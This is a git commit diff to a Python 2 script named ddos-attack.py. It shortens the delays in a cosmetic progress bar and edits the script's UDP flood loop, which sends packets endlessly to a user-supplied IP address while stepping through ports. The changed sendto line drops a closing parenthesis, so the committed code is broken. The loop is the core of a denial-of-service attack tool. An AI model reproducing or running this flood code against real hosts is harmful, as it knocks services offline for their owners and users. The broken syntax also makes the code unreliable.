868ef44311ab903dadc9493646370925a5965f6c
ChuUnSaMa <68302375+ChuUnSaMa@users.noreply.github.com>
2020-08-25 14:30:07 +0300

    Update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -31,18 +31,18 @@ port = input("Port       : ")
 os.system("clear")
 os.system("figlet Attack Starting")
 print "[                    ] 0% "
-time.sleep(5)
+time.sleep(3)
 print "[=====               ] 25%"
-time.sleep(5)
+time.sleep(3)
 print "[==========          ] 50%"
-time.sleep(5)
+time.sleep(3)
 print "[===============     ] 75%"
-time.sleep(5)
+time.sleep(3)
 print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,port))
+     sock.sendto(bytes,(ip,port)
      sent = sent + 1
      port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
